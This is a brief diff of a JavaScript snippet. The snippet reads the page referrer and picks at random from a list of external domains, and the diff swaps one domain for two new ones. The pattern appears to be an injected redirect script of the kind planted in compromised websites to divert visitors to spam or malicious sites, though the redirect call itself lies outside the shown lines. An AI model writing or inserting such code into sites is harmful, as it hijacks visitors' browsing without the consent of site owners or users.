@@ -4,8 +4,8 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([
-							'https://yurtdisiforexfirmalari.com/',
-						 	 
+							'https://kasef.co.uk/',
+						 	'https://geulis.xyz/', 
 							]);
 
 				function rChoice(arr) {
